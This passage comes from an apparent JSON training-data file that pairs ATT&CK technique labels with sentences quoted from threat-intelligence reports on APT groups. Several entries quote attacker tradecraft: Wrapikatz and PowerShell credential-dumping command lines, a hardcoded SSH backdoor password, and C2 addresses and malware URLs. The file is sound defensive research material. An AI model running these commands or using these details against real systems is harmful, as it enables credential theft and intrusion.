        "Deploying a multi-layered approach including access policies, anti-virus, network monitoring and whitelisting can help ensure customers are protected against threats such as this.\u00a0 Users of Kaspersky products are protected as well against this threat by one of the following detections:  PDM:Exploit.Win32.Generic HEUR:Exploit.SWF.Generic HEUR:Exploit.MSOffice.Generic  More information about BlackOasis APT is available to customers of Kaspersky Intelligence Reporting Service",
        "Exploitation of this vulnerability allows an attacker to escalate privileges on the affected system",
        "All zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash",
        "Year  Country  Industry  Malware  2014  Vietnam  Network Security  WINDSHIELD  2014  Germany  Manufacturing  WINDSHIELD  2015  Vietnam  Media  WINDSHIELD  2016  Philippines  Consumer products  KOMPROGO WINDSHIELD SOUNDBITE BEACON \u00a0 2016  Vietnam  Banking  WINDSHIELD  2016  Philippines  Technology Infrastructure  WINDSHIELD  2016  China  Hospitality  WINDSHIELD  2016  Vietnam  Media  WINDSHIELD  2016  United States  Consumer Products  WINDSHIELD PHOREAL BEACON SOUNDBITE  Table 1: APT32 Private Sector Targeting Identified by FireEye APT32 Interest in Political Influence and Foreign Governments In addition to focused targeting of the private sector with ties to Vietnam, APT32 has also targeted foreign governments, as well as Vietnamese dissidents and journalists since at least 2013",
        "APT32 regularly used stealthy techniques to blend in with legitimate user activity:  During one investigation, APT32 was observed using a privilege escalation exploit (CVE-2016-7255) masquerading as a Windows hotfix",
        "Documents with the Flash exploit managed to evade static defenses and remain undetected as an exploit on VirusTotal",
        "McAfee detects these threats as:  RDN/Generic Exploit RDN/Generic.dx Generic PWS.y Generic.hbg Exploit-CVE2018-4878  McAfee customers are also covered by McAfee Global Threat Intelligence Web Reputation classification, which rate these URLs as High Risk",
        "The database is located in the \u201c/usr/lib/cva-ssys/My_BD\u201d folder (\u201c~/.local/cva-ssys/My_BD\u201d\u2014if the Trojan does not have root privileges)",
        "The attacker leveraged multiple exploits, targeting both\u00a0CVE-2014-6332\u00a0and\u00a0CVE-2014-4113",
        "CVE-2014-4113 is a privilege escalation vulnerability that was\u00a0disclosed publicly on 2014-10-14",
        "The first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe with the elevated privileges",
        "Are the attackers using any zero-day vulnerabilities? No zero-day vulnerabilities have been found in the analysis of the samples obtained regarding this campaign",
        "These vulnerabilities were patched last December 28 2015, April 5, 2016, and May 12, 2016, respectively",
        "Trend Micro Solutions Trend Micro\u2122\u00a0Deep Security\u2122 and\u00a0Vulnerability Protection\u00a0provide\u00a0virtual patching\u00a0that protects endpoints from threats such as malicious redirections to malware-hosting URLs, as well as those that exploit unpatched vulnerabilities",
        "OfficeScan\u2019s Vulnerability Protection shields endpoints from identified and unknown vulnerability exploits even before patches are even deployed.\u00a0Trend Micro\u2122\u00a0Deep Discovery\u2122 provides detection, in-depth analysis, and proactive response to attacks using exploits and other similar threats through specialized engines, custom\u00a0sandboxing, and seamless correlation across the entire attack lifecycle, allowing it to detect these attacks even without any engine or pattern update",
        "Dubbed \u2018SpeakUp\u2019, the new Trojan exploits known vulnerabilities in six different Linux distributions",
        "exploits a known Windows privilege escalation vulnerability ( ) on unpatched computers.",
        "Among them, we found variations on the    EternalDarkness SMBv3 exploit (CVE-2020-0796)  , a , the privilege escalation exploit published on the Google Security Github account, and the privilege escalation exploit."
    ],
    "security software discovery": [
        "A 2016 Novetta report detailed the work of security vendors attempting to unveil tools and infrastructure related to the 2014 destructive attack against Sony Pictures Entertainment",
        "Detecting Avast\u00a0 A unique feature of this latest Astaroth Trojan campaign is the malware's ability to search for specific security products and exploit them",
        "The analysis of the tools and techniques used in the Astaroth campaign show how truly effective LOLbins are at evading antivirus products",
        "Tools CTU researchers observed BRONZE UNION using the following tools in intrusions since the 2015 analysis, but clients should assume that the threat group still has access to the previously reported tools",
        "Organizations that Buckeye targeted over time, per region Malware and tools Buckeye uses a number of hacking tools as well as malware",
        "In doing so, it will attempt to detect the following Anti-Virus products via various techniques:  Trend Micro Kaspersky Symantec Avira AVG ALYac Ahnlab  Ahnlab and ALYac are the most widely used Anti-Virus solutions in South Korea, and Trend Micro and the rest are also known to be most widely used in Taiwan",
        "When combined with email tracking software, APT32 was able to closely track phishing delivery, success rate, and conduct further analysis about victim organizations while monitoring the interest of security firms",
        "This group was observed using tactics such as registering typosquatting domains for security or technology vendors, abusing open-source penetration testing tools, and leveraging novel file types as anti-analysis techniques",
        "APT12 closely monitors online media related to its tools and operations and reacts when its tools are publicly disclosed",
        "Types of attacks possibly averted include Structured Query Language (SQL) injection, cross-site scripting, and command injection.Use stringent file reputation settings \u2013 Tune the file reputation systems of your anti-virus software to the most aggressive setting possible",
        "Keep security software up-to-date with the latest definitions  Protection Norton Security, Symantec Endpoint Protection, and other Symantec security products protect users against these threats through the following detections: AV  Backdoor.Cadelspy Backdoor.Remexi Backdoor.Remexi.B  IPS  System Infected: Backdoor.Cadelspy Activity 2 System Infected: Backdoor.Remexi Activity  Indicators of compromise We have also compiled an indicators-of-compromise document containing further details which can be used to help identify the threats if they are present in your environment",
        "We would like to thank White-Hat, Tom Lancaster\u00a0of Palo Alto Networks, Michael Yip of Stroz Friedberg, security researcher Marcus, and other security researchers and organizations who shared information and provided feedback",
        "In addition to obfuscation techniques, it also has the ability to detect security tools on the analysis machine, and can also shut down the system if it detects the presence of such tools",
        "Checks for the presence of security tools (detailed in the Appendix) and if any of these security tools are discovered, then the system will be shut down, as shown in Figure 14",
        "Figure 14: System shut down upon discovery of security tools  Ability to receive PowerShell script from the C2 server and execute on the machine",
        "Additionally it checks to determine if common analysis tools are currently running on the infected system",
        "Given the regional file format used there is a chance that some security software suites may not handle them well, and this may have provided an evasion case for the attacker.The documents sent to the targets were titled \"Analysis of \"Northern New Year in 2017\" and used the official logo of the Korean Ministry of Unification",
        "Smart, optimized, and connected, XGen security powers Trend Micro\u2019s suite of security solutions: Hybrid Cloud Security, User Protection, and Network Defense",
        "Link analysis of infrastructure and tools also revealed a potential relationship between Magic Hound and the adversary group called \u201cRocket Kitten\u201d (AKA Operation Saffron Rose, Ajax Security Team, Operation Woolen-Goldfish) as well as an older attack campaign called Newscasters",
        "As seen below, the relational analysis proved to be quite fruitful:  Figure 1 Overview of relationships We rapidly discovered a different set of tools communicating to the exact same C2 servers as those two Word documents, in addition to other tools communicating to other subdomain variations of chrome-up[.]date as seen in the following graphic:  Figure 2 Command and control overlaps From there, we were able to map out a large infrastructure separating out into four categories of tools: downloaders, droppers, loaders, and payloads",
        "The toolset used by the Magic Hound campaign was an assortment of custom tools, as well as open sourced tools available to the general public",
        "They are known for \u201cliving off the land,\u201d meaning they use already available tools and software installed on the computer to operate, and once inside a target network, they will tailor their malware specifically to the target",
        "Traditional antivirus software and other systems that rely on low-level indicators do not effectively detect and block common and pervasive malware",
        "End users can benefit from security solutions such as\u00a0Trend Micro Home Security for Mac, which provides comprehensive security and multi-device protection against cyberthreats",
        "Enterprises can benefit from Trend Micro\u2019s\u00a0Smart Protection Suites\u00a0with XGen security, which infuses high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across any user activity and any endpoint",
        "As we discover new tools used by this group, we have consistently discovered overlapping artifacts with previously used tools and infrastructure",
        "Mitigation Security and system/IT administrators must practice due diligence in protecting their websites and web-based applications from threats that can undermine their security, and hijack them to do the bad guys\u2019 bidding\u2014delivering malware to their victims",
        "Network Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat",
        "AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products",
        "Mitigation As this sample installs itself through the use of EternalBlue, the targeted protocol is SMB.\u00a0 Because of this, in order to best mitigate and avoid possible installations, you need your system updated to the latest security patches.\u00a0 Specifically, you\u2019d want to make sure that you have MS17-010 installed, as this is the security patch that patches the EternalBlue vulnerability",
        "The malware queries the value for the flag BeingDebugged from PEB to check whether the process is being debugged. ",
        ""
    ],
    "data from local system": [
        "APT38 is characterized by long planning, extended periods of access to compromised victim environments preceding any attempts to steal money, fluency across mixed operating system environments, the use of custom developed tools, and a constant effort to thwart investigations capped with a willingness to completely destroy compromised machines afterwards",
        "The RIPTIDE exploit document drops its executable file into the C:\\Documents and Settings\\{user}\\Application Data\\Location folder while the HIGHTIDE exploit document drops its executable file into the C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL SETTINGS\\Temp\\ folder",
        "In many payment card data breaches, a point-of-sale (POS) system is infected with malware that searches for specific processes in memory known to store card data in plain text",
        "Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites."
    ],
    "remote desktop protocol remote services-multi": {
        "technique_names": [
            "remote desktop protocol",
            "remote services"
        ],
        "sentances": [
            "Lateral Movement, Maintain Presence, and Complete Mission APT39 facilitates lateral movement through myriad tools such as Remote Desktop Protocol (RDP), Secure Shell (SSH), PsExec, RemCom, and xCmdSvc"
        ]
    },
    "connection proxy": [
        "Custom tools such as REDTRIP, PINKTRIP, and BLUETRIP have also been used to create SOCKS5 proxies between infected hosts",
        "[9] \u201cHKU concern group raises proxy fears in key vote.\u201d EIJ Insight",
        "In green, functions from Keychaindump C&C communication Keydnap is using the onion.to Tor2Web proxy over HTTPS to report back to its C&C server",
        "This can be complemented by restricting direct internet access to the company\u2019s internal networks while using proxies to access external resources"
    ],
    "remote desktop protocol": [
        "In addition to using RDP for lateral movement, APT39 has used this protocol to maintain persistence in a victim environment",
        "Lateral Movement APT40 uses many methods for lateral movement throughout an environment, including custom scripts, web shells, a variety of tunnelers, as well as Remote Desktop Protocol (RDP)",
        "Containment provided by enclaving also makes incident cleanup significantly less costly.Configure firewalls to disallow Remote Desktop Protocol (RDP) traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary virtual private network (VPN) with lower privileges.Audit existing firewall rules and close all ports that are not explicitly needed for business",
        "",
        "Following the compromise of this system, analysts identified FIN6 leveraged stolen credentials to move laterally within the environment using the Windows\u2019 Remote Desktop Protocol (RDP).",
        "FIN6 used another set of compromised credentials with membership to additional groups in the domain to RDP to other hosts",
        "FIN6 also moved laterally to servers in the environment using RDP and configured them as malware \u201cdistribution\u201d servers."
    ],
    "data compressed": [
        "To complete its mission, APT39 typically archives stolen data with compression tools such as WinRAR or 7-Zip",
        "APT40 has been observed consolidating files acquired from victim networks and using the archival tool rar.exe to compress and encrypt the data before exfiltration",
        "This crafted zip archive exploited a WinRAR flaw that makes files in zip archives appear to have a different name and file extension",
        "On September 24, 2018, we observed an organization targeted by OilRig attempting to download a Zip archive from the following URL: hxxp://193.111.152[.]13/[redacted]-ITsoftwareUpdate.zip This Zip archive contained a file named [redacted]-ITsoftwareUpdate.exe (SHA256: 5f42deb792d8d6f347c58ddbf634a673b3e870ed9977fdd88760e38088cd7336), which is a variant of the OopsIE Trojan we described in detail in a blog we published in September 2018",
        "RARM Creates RAR files per logical drive containing data with timestamps for the past 30 days, then uploads RAR to the C2 server using a POST command at the path \u201c/FeedBack.php\u201d",
        "RARW Creates RAR files per logical drive containing data with timestamps for the past 7 days, then uploads RAR to the C2 server using a POST command at the path \u201c/FeedBack.php\u201d",
        "When exfiltrating the keychain, the keychain field is used instead of data",
        "Each of the emails had a password protected RAR archive attached named credential.rar",
        "Sometimes it is a high profile, legitimate site such as \u201cdiplomacy.pl\u201d, hosting a ZIP archive",
        "The ZIP archive contains a RAR SFX which installs the malware and shows an empty PDF decoy",
        "The entire command structure gets compressed with zlib and then encrypted using a custom stream cipher.",
        "",
        "The results are Gzipped and saved under random file in the temp folder."
    ],
    "file deletion software packing-multi": {
        "technique_names": [
            "file deletion",
            "software packing"
        ],
        "sentances": [
            "Figure 2: APT39 attack lifecycle There are some indications that APT39 demonstrated a penchant for operational security to bypass detection efforts by network defenders, including the use of a modified version of Mimikatz that was repacked to thwart anti-virus detection in one case, as well as another instance when after gaining initial access APT39 performed credential harvesting outside of a compromised entity's environment to avoid detection"
        ]
    },
    "credential dumping exploitation for privilege escalation-multi": {
        "technique_names": [
            "credential dumping",
            "exploitation for privilege escalation",
            "ping"
        ],
        "sentances": [
            "Escalate Privileges APT40 uses a mix of custom and publicly available credential harvesting tools to escalate privileges and dump password hashes",
            "In one incident, the threat actor used the Wrapikatz tool (w.exe) with a usage statement that retrieves various passwords and Windows credentials from memory and compiles them in w.txt: c:\\programdata\\w.exe \u2013w \u2013l \u2013c>>c:\\programdata\\w.txt In a separate incident, the threat actor used access provided by extensive web shell deployment to harvest account credentials:  2016-10-03T09:27:47   dir 2016-10-03T09:28:11   w64.log >ppp.log 2016-10-03T09:30:10     PowerShell.exe -ExecutionPolicy Bypass -File getpwd.ps1 >iistail.log  In another example, BRONZE UNION leveraged the Kekeo credential abuse tool to exploit CVE-2014-6324, a vulnerability in Microsoft's implementation of the Kerberos network authentication protocol"
        ]
    },
    "remote services": [
        "Internal Reconnaissance APT40 uses compromised credentials to log on to other connected systems and conduct reconnaissance",
        "Figure 4 \u2013 Backdoored authentication function in SSH server As you can see in Figure 4, this version of Dropbear SSH will authenticate the user if the password passDs5Bu9Te7 was entered"
    ],
    "brute force": [
        "APT40 also uses publicly available brute-forcing tools and a custom utility called DISHCLOTH to attack different protocols and services",
        "During our initial research into the TwoFace++ loader, we were unable to extract the embedded payload using the same brute forcing technique that we used on the initial TwoFace loader samples",
        "We were able to brute force the actor-provided key using the inverse arithmetic operations using the embedded salt and embedded ciphertext, so we were able to extract the embedded webshells with ease",
        "It then takes note of the infected machine\u2019s IP address, user, domain, hostname, OS and Service Pack, and the username and password combination that worked during the brute force routine",
        "Its main functions are:  Brute-force using a pre-defined list of usernames and passwords in an attempt to login to Admin panels",
        "TG-3390 attempts to reenter the environment by identifying accounts that do not require two-factor authentication for remote access solutions, and then brute forcing usernames and passwords",
        "Several of the tools are freely-available Windows utilities, such as Amplia Security\u2019s Windows Credential Editor. We also found a nearly complete set of the Microsoft SysInternals  PsTools package, a copy of NLBrute (which attempts to brute-force passwords), installers for the commercial TeamViewer and AnyDesk remote support tools, and a number of utilities created by endpoint security vendors that are designed to remove their (and other companies\u2019) endpoint security and antivirus tools from a computer.",
        "We found a brute-force tool called NLBrute , with configuration files that tell us it had been set up to use an included set of username and passwords to try to break in to machines that have Remote Desktop enabled"
    ],
    "commonly used port": [
        "Common TCP ports 80 and 443 are used to blend in with routine network traffic",
        "Old Comnie Variant C2 Decoder      12345678910111213141516171819  import requestsimport sysimport redef decode(data):\u00a0\u00a0o = \"\"\u00a0\u00a0for c in data:\u00a0\u00a0\u00a0\u00a0if c == \"*\":\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0o += \".\"\u00a0\u00a0\u00a0\u00a0elif c == \"|\":\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0o += \":\"\u00a0\u00a0\u00a0\u00a0elif c == \"+\":\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0o += \";\"\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0o += chr(ord(c)-49)\u00a0\u00a0return or = requests.get(sys.argv[1])fd = r.textdata = fd.split(\"++a++\")[1].split(\"++a++\")[0]print(decode(data))     \u00a0 Samples Analyzed eed5945c36ba22a2531dd2d9dd7bc4e17e68544d512be75670919caf287c1b4a 8026442b812469e48ccd11611ab6eacdcb312a8f1aabd563b7f4cb4868315e16 c8951038fd53321661274e5a12532c3fb6f73c75fd75503a1089c56990658fef 48a1ce103e5bf47c47cc5ed40b2dc687ebaf3674d667419287bcb1d0b8d8dda6 e06b797a24fa03a77e0d5f11b0cf0f4f038e0a9ea04d4981d39148969349c79c 7282d0709449abe16457864f58157cac8d007571dc5d463d393d1ae2605d17e0 bf6ee8426245b167a69292e513c0841d818b310dda87daea649221f4e0afd1b3 62b98dde60cb4dd0d0088bde222c5c2c4c92560cccf4753f1ce94e044093ab85 756952652290ad09fe03c8674d44eab2077b091398187c3abcb6f1ddc462c32d 639a49390c6f8597d36ec0bd245efa1b4a078c0506fb515e577a40389b39a614 29ed6eb3c882b018c2bb6bf2f8eb15069dc5510ca119abebf24f09e3c91f10aa 0e8a4e4d5ca501bad25a730fb5de534fa324c6ac23e0a573524693f2d996d105 316a0c6849f183a1a52d0c7648e722c4ca85bd57b0804a147c0c8656b84bbdb9 \u00a0 Identified C2s 121.126.211[.]94:8080 113.196.70[.]11:80,8080 133.130.101[.]47:443 123.51.208[.]157:443;8000;8080 \u00a0 C2 Hosting URLs (DDR URLs) github[.]com/korlee5643 itsmonsee.tumblr[.]com allworldnewsway.blogspot[.]com",
        "Resulting script on the compromised government websites Users were redirected to https://google-updata[.]tk:443/hook.js, a BEeF instance, and https://windows-updata[.]tk:443/scanv1.8/i/?1, an empty ScanBox instance that answered a small piece of JavaScript code",
        "PUPY LOADER The Pupy RAT comes packaged by default with loaders that can run the RAT on a variety of platforms such as Windows, macOS, Linux and Android",
        "In addition, although the 2017 campaign has been documented, during our research regarding MirageFox, we found a recently uploaded binary (6/8/2018) from the 2017 campaign, pretty much identical to a RAT mentioned in their RoyalAPT report, barely detected with only 7/66 detections on VirusTotal.\u00a0 APT15 Code Reuse We found the new version of the RAT on VirusTotal hunting, by a YARA signature we created based off code only found in Mirage and Reaver, both attributed to Chinese government affiliated groups",
        "These files are then transmitted to a threat actor, often over commonly open ports 80 and 443 (HTTP and HTTPS)",
        "Msoffice365cdn[.]com resolves to 80.82.79.221, which resides on the same class C network range as the IP resolution of office365-technical[.]info, which resolves to 80.82.79.240",
        "SpyNote RAT\u00a0builder The SpyNote Remote Access Trojan (RAT) builder is gaining popularity in the hacking community, so we decided to study its pervasiveness",
        "KONNI is a RAT that is believed to have \u00a0been in use for over four years, with a wide array of functionalities, often leveraging free web hosting providers like 000webhost for its C2 infrastructure",
        "Command and control To traverse the firewall, C2 traffic for most TG-3390 tools occurs over ports 53, 80, and 443",
        "Upon first execution of TONEDEAF, FireEye identified a callback to the C2 server offlineearthquake[.]com over port 80.",
        "The Metasploit reverse HTTP payload was configured to communicate with the command and control (C2) IP address 176.126.85[.]207 with a randomly named resource such as\u201d over TCP port 443.",
        ""
    ],
    "exploitation for privilege escalation exploitation for client execution-multi": {
        "technique_names": [
            "exploitation for privilege escalation",
            "exploitation for client execution"
        ],
        "sentances": [
            "Exploit Analysis  Despite being an older vulnerability, many threat actors continue to leverage CVE-2012-0158 to exploit Microsoft Word",
            "Unpacking routine for SWF exploit The exploit is a memory corruption vulnerability that exists in the \u201ccom.adobe.tvsdk.mediacore.BufferControlParameters\u201d class.\u00a0 If the exploit is successful, it will gain arbitrary read / write operations within memory, thus allowing it to execute a second stage shellcode",
            "Buckeye has been known to exploit zero-day vulnerabilities in the past, such as CVE-2010-3962 in an campaign in 2010 and CVE-2014-1776 in 2014",
            "These vulnerabilities include:CVE-2015-6585: Hangul Word Processor VulnerabilityCVE-2015-8651: Adobe Flash Player 18.0.0.324 and 19.x VulnerabilityCVE-2016-0034: Microsoft Silverlight 5.1.41212.0 VulnerabilityCVE-2016-1019: Adobe Flash Player 21.0.0.197 VulnerabilityCVE-2016-4117: Adobe Flash Player 21.0.0.226 VulnerabilityDHS recommends that organizations upgrade these applications to the latest version and patch level",
            "During the past few months, APT34 has been able to quickly incorporate exploits for at least two publicly vulnerabilities (CVE-2017-0199 and CVE-2017-11882) to target organizations in the Middle East",
            "Since Operation Clandestine Fox, we have observed this actor execute multiple attacks that did not rely on zero-day exploits.\u00a0The combination of this sustained operational tempo and lack of zero-day exploits may indicate that this group has changed strategy and has decided to attack more frequently and does not have steady access to zero-day exploit code.\u00a0No matter the strategy, this actor has shown an ability to operate successfully",
            "In particular, the threat actors have exploited CVE-2011-3544, a vulnerability in the Java Runtime Environment, to deliver the HttpBrowser backdoor; and CVE-2010-0738, a vulnerability in JBoss, to compromise internally and externally accessible assets used to redirect users' web browsers to exploit code"
        ]
    },
    "modify registry registry run keys / startup folder-multi": {
        "technique_names": [
            "modify registry",
            "registry run keys / startup folder"
        ],
        "sentances": [
            "If the mutex does not exist and a Windows Startup Registry key with name \u201cSystem Update\u201d does not exist, the malware performs its initialization routine by:  Copying itself to the path %PROGRAMDATA%\\svchost.exe Sets the Windows Startup Registry key with the name \u201cSystem Update\u201d which points to the above dropped payload"
        ]
    },
    "uncommonly used port": [
        "The malware proceeds to connect to the C2 server at 5.189.145.248 at regular intervals through the use of TCP over port 10500",
        "1/12/14 3/5/14 127.0.0.1 N/A   3/5/14 3/31/14 103.24.0.142 Hong Kong   3/31/14 10/27/14 103.24.1.54 Hong Kong   10/27/14 11/9/14 127.0.0.1 N/A   11/9/14 5/25/15 127.0.0.3 N/A   5/25/15 Current as of this publication 127.0.0.1 N/A    Table 5"
    ],
    "security software discovery system information discovery-multi": {
        "technique_names": [
            "security software discovery",
            "system information discovery"
        ],
        "sentances": [
            "It was also able to use a component of multinational antivirus software Avast to gain information about the target system, as well as a process belonging to Brazilian information security company GAS Tecnologia to gather personal information"
        ]
    },
    "process injection": [
        "This version\u00a0injects a malicious module into one of\u00a0Avast's processes, whereas early versions of the campaign detected Avast and quit",
        "On execution, the tool injects itself into lsass.exe and is triggered with the argument \u201cdig\u201d",
        "Figure 5 shows Phishery\u2019s output to the command that injects a URL into a file named \u201cgood_test.docx\u201d, which it will save the resulting file to \u201cbad_test.docx\u201d",
        "It is capable of the following functions:  Collect file/folder/drive information Download files and additional malware Launch/terminate/enumerate process Update configuration data Delete files Inject code from files to other running process Utilize proxy Open reverse shell Run in passive mode \u2014 instead of actively connecting to the command and control (C&C) server, the backdoor will open and listen to a port then receive commands through it  Once the backdoor is loaded, it will then load the encrypted configuration file Auditcred.dll.mui/rOptimizer.dll.mui to extract the C&C information and connect to it",
        "As a result of all these steps, the last-stage Trojan is injected into svchost.exe\u2019s process memory",
        "Process injection helps the malware avoid detection; however, review of active network connections show notepad.exe communicating to 185",
        "This shellcode injects the final payload taken from the resource section into the original RegAsm.exe process",
        "Traps\u00a04.0 can be configured to protect the processes that are cited as being abused in this blog from loading malicious code",
        "Injects ma32.dll into \u201cwwahost.exe\u201d or \u201caudacity.exe\u201d",
        "05 27 28 obj32.bin obj32.bin obj64.bin Shellcode template is used by Reinstaller/Injector (rsXX.dll) and AudioRecorder4MetroApp (meXX.dll) for injecting into running processes",
        "Pupy can communicate using multiple transports, migrate into processes using reflective injection, and load remote python code, python packages and python C-extensions from memory",
        "Meanwhile, injection and delivery techniques are undergoing changes in 2018 with reflective loaders and code enhancements",
        "2e0361fd73f60c76c69806205307ccac, update.dll (MiniDuke), 425kb (internal name = \u201cUserCache.dll\u201c) 9e3f3b5e9ece79102d257e8cf982e09e, cache.dll (CozyDuke), 425kb (internal name = \u201cUserCache.dll\u201c) The two share identical export function names in their export directories, and the naming appears to be randomly assigned at compile time",
        "*Command_Create&Inject:\u00a0 This command creates a new process (using a supplied filename as the process name) and then injects malicious code into it",
        "64)   u= {B5B70BD7-87FC-499A-B4D1- 98163306F0D8} A GUID   r= 1 Boolean value if the malware is running as injected code   t= 8035187 Number of milliseconds the computer has been running    Table 3",
        "The loader will then inject a DLL backdoor into dllhost.exe",
        "FakeRun\u2019s PDB string (D:\\Work\\Project\\VS\\house\\Apple\\Apple_20180115\\Release\\FakeRun.pdb) indicates the loader will execute dllhost.exe and inject one malicious DLL file, which is the backdoor, into this process",
        "TClient is injected into dllhost.exe Malware Analysis\u00a0 wab32res.dll (FakeRun loader) loads TClient",
        "Successfully checking the loader will execute the dllhost.exe process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe, as there can be multiple instances of it depending on the number of programs using the Internet Information Services",
        "20 New processes The malicious svchost constantly queries ieframe.dll, as well as IWebBrowser2 Interface using CLSID dc30c1661-cdaf-11D0-8A3E-00c04fc9e26e, both key components to interact with Internet Explorer",
        "Figure 2: De-obfuscated code scheduling the second task to run a script embedded in a blog page The last section of script embedded in 29[.]html then downloads Revenge RAT and injects the binary into the memory of a running process, as seen in Figure 3",
        "The encoded payload was a Cobalt Strike httpsstager that was injected into the PowerShell process that ran the command",
        "After finding the process id, the shellcode uses standard functions to allocate and write memory within Explorer and then uses low-level API RtlCreateUserThread for thread injection.",
        "It\u2019s also used to inject code into its target processes using the technique."
    ],
    "shortcut modification remote file copy-multi": {
        "technique_names": [
            "shortcut modification",
            "remote file copy"
        ],
        "sentances": [
            "The downloaded .7zip file contains a .lnk file that, once pressed, initializes the malware"
        ]
    },
    "timestomp shortcut modification-multi": {
        "technique_names": [
            "timestomp",
            "shortcut modification"
        ],
        "sentances": [
            "An obfuscated command is located inside the Target bar in the .lnk file properties.\u00a0  Hidden command inside the .lnk file"
        ]
    },
    "shortcut modification obfuscated files or information-multi": {
        "technique_names": [
            "shortcut modification",
            "obfuscated files or information"
        ],
        "sentances": [
            "The full obfuscated command inside the .lnk file"
        ]
    },
    "windows management instrumentation": [
        "wmic.exe is a powerful, native Windows command line utility used to interact with Windows Management Instrumentation (WMI)",
        "This utility is able to execute complicated WQL queries and WMI methods",
        "Instead of using systeminfo and tasklist commands, the C# variant of Zebrocy uses WMI queries to gather this information",
        "POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI)",
        "POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI",
        "Windows Management Instrumentation WMI is an administrative framework that is built into every version of Windows since 2000",
        "WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell",
        "Windows system WMI data is stored in the WMI common information model (CIM) repository, which consists of several files in the System32\\wbem\\Repository directory",
        "WMI classes are the primary structure within WMI",
        "WMI permanent event subscriptions can be used to trigger actions when specified conditions are met",
        "Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding",
        "WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others",
        "APT29 then created a WMI event subscription in order to execute the backdoor",
        "In one instance, APT29 created a Filter named BfeOnServiceStartTypeChange (Figure 1), which they configured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time.\u00a0    Figure 1: \u201cBfeOnServiceStartTypeChange\u201d WMI Query Language (WQL) filter condition The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration",
        "This excellent whitepaper by William Ballenthin, Matt Graeber and Claudiu Teodorescu contains additional information on WMI offense, defense and forensics",
        "This presentation by Christopher Glyer and Devon Kerr contains additional information on attacker use of WMI in past Mandiant investigations",
        "The FireEye FLARE team released a WMI repository-parsing tool that allows investigators to extract embedded data from the WMI repository and identify WMI persistence.",
        "Initial triage begins with connecting to Windows Management Instrumentation (WMI) via the \u201cROOT\\CIMV2\u201d namespace",
        "The payload uses WMI queries and checks running processes for evidence that the script may be executing within an analysis environment",
        "Technique Description   Fan Check The Trojan will perform the following WMI query: \u00a0 Select * from Win32_Fan \u00a0 According to MSDN, this query should return a class that provides statistics on the CPU fan",
        "This suggests that other WMI-based VM detection techniques may also detect certain physical systems if those systems do not support the specific WMI query",
        "Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality",
        "Leveraging Existing Windows Services to Deliver Malware Windows Management Instrumentation Console (WMIC) provides a command line interface to WMI",
        "WMIC is a good tool for managing windows hosts and is widely favored by desktop administrators",
        "This is attack vector presents interesting problems, as blocking or restricting the use of WMIC may not be a feasible solution for some administrators",
        "Most of the PowerShell commands would call Windows Management Instrumentation (WMI)"
    ],
    "exfiltration over command and control channel": [
        "This location data gives the attacker a unique edge, as they can specify a target country or city to attack and maximize their accuracy when choosing a particular target.\u00a0  \u00a0The .txt file contains information about the C2 domain and infected machine, as detected in a Cybereason Lab environment",
        "Malware  Capabilities  WINDSHIELD   Command and control (C2) communications via TCP raw sockets Four configured C2s and six configured ports \u2013 randomly-chosen C2/port for communications Registry manipulation Get the current module's file name Gather system information including registry values, user name, computer name, and current code page File system interaction including directory creation, file deletion, reading, and writing files Load additional modules and execute code Terminate processes Anti-disassembly   KOMPROGO   Fully-featured backdoor capable of process, file, and registry management Creating a reverse shell File transfers Running WMI queries Retrieving information about the infected system   SOUNDBITE   C2 communications via DNS Process creation File upload Shell command execution File and directory enumeration/manipulation Window enumeration Registry manipulation System information gathering   PHOREAL   C2 communications via ICMP Reverse shell creation Filesystem manipulation Registry manipulation Process creation File upload   BEACON (Cobalt Strike)   Publicly available payload that can inject and execute arbitrary code into processes Impersonating the security context of users Importing Kerberos tickets Uploading and downloading files Executing shell commands Configured with malleable C2 profiles to blend in with normal network traffic Co-deployment and interoperability with Metasploit framework SMB Named Pipe in-memory backdoor payload that enables peer-to-peer C2 and pivoting over SMB    Table 3: APT32 Malware and Capabilities APT32 operators appear to be well-resourced and supported as they use a large set of domains and IP addresses as command and control infrastructure",
        "The malware performs the following activities:  Builds imports by dynamically loading APIs Decrypts strings needed for control server communications Performs control server communications Handles commands issued by the control server Uninstalls self from the system  The malicious thread dynamically loads the APIs it needs at the beginning of its execution using LoadLibrary() and GetProcAddress()",
        "In response, if the status is OK, then a TOKEN is received from the C2 server that is used to synchronize the activities between the victim\u2019s machine and the C2 server",
        "After obtaining the unique ID from the C2 server, the Trojan calls the \u201cSetAbStatById\u201d method to notify the C2 server of its status of \u201c1\u201d to notify the server it had successfully received the filename and file data"
    ],
    "deobfuscate/decode files or information obfuscated files or information-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "obfuscated files or information"
        ],
        "sentances": [
            "Obfuscation Mechanism for the JScript Code The malicious JScript code obfuscation relies on two main techniques",
            "The hook main module contained encrypted strings and handled all the function calls and strings as the references in a large structure",
            "The main function of the dropper All strings within the dropper, as well as the backdoor, are encrypted using a hardcoded RSA256 key",
            "After decrypting and decompressing the strings, we can trivially identify aspects of the PlugX configuration"
        ]
    },
    "data staged": [
